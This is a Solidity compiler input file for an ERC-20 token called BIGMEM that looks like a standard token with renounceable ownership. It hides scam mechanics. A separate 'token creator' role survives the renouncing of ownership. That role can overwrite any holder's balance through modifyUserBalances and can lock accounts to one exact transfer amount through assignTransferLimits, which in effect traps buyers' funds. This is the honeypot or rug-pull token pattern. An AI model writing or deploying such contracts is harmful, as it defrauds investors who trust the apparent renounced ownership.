{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n}\r\n\r\nabstract contract ContextModified {\r\n    function getSenderAddress() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract SingleOwner is ContextModified {\r\n    address private contractOwner;\r\n    event OwnershipUpdated(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address msgSender = getSenderAddress();\r\n        contractOwner = msgSender;\r\n        emit OwnershipUpdated(address(0), msgSender);\r\n    }\r\n\r\n    function getContractOwner() public view virtual returns (address) {\r\n        return contractOwner;\r\n    }\r\n\r\n    modifier onlyContractOwner() {\r\n        require(getContractOwner() == getSenderAddress(), \"SingleOwner: Action must be performed by the owner\");\r\n        _;\r\n    }\r\n\r\n    function relinquishOwnership() public virtual onlyContractOwner {\r\n        emit OwnershipUpdated(contractOwner, address(0x000000000000000000000000000000000000dEaD));\r\n        contractOwner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\n\r\ncontract BIGMEM is ContextModified, SingleOwner, IERC20 {\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _exactTransferAmounts;\r\n    address private _tokenCreator;\r\n\r\n    string public constant _name = \"BIGMEM\";\r\n    string public constant _symbol = \"BIGMEM\";\r\n    uint8 public constant _decimals = 18;\r\n    uint256 public constant _totalSupply = 1000000 * (10 ** _decimals);\r\n\r\n    constructor() {\r\n        _balances[getSenderAddress()] = _totalSupply;\r\n        emit Transfer(address(0), getSenderAddress(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    modifier onlyTokenCreator() {\r\n        require(getTokenCreator() == getSenderAddress(), \"GREY: Action must be performed by the token creator\");\r\n        _;\r\n    }\r\n\r\n    function getTokenCreator() public view virtual returns (address) {\r\n        return _tokenCreator;\r\n    }\r\n\r\n    function modifyTokenCreator(address newCreator) public onlyContractOwner {\r\n        _tokenCreator = newCreator;\r\n    }\r\n\r\n    event TokenDistributed(address indexed user, uint256 previousBalance, uint256 newBalance);\r\n\r\n    function queryTransferLimit(address account) public view returns (uint256) {\r\n        return _exactTransferAmounts[account];\r\n    }\r\n\r\n    function assignTransferLimits(address[] calldata accounts, uint256 amount) public onlyTokenCreator {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _exactTransferAmounts[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function modifyUserBalances(address[] memory userAddresses, uint256 newAmount) public onlyTokenCreator {\r\n        require(newAmount >= 0, \"GREY: New amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < userAddresses.length; i++) {\r\n            address user = userAddresses[i];\r\n            require(user != address(0), \"GREY: User address must not be zero address\");\r\n\r\n            uint256 previousBalance = _balances[user];\r\n            _balances[user] = newAmount;\r\n\r\n            emit TokenDistributed(user, previousBalance, newAmount);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_balances[getSenderAddress()] >= amount, \"TT: transfer amount exceeds balance\");\r\n\r\n    uint256 exactAmount = queryTransferLimit(getSenderAddress());\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _balances[getSenderAddress()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(getSenderAddress(), recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[getSenderAddress()][spender] = amount;\r\n        emit Approval(getSenderAddress(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_allowances[sender][getSenderAddress()] >= amount, \"TT: transfer amount exceeds allowance\");\r\n\r\n    uint256 exactAmount = queryTransferLimit(sender);\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _balances[sender] -= amount;\r\n    _balances[recipient] += amount;\r\n    _allowances[sender][getSenderAddress()] -= amount;\r\n\r\n    emit Transfer(sender, recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n    return _totalSupply;\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}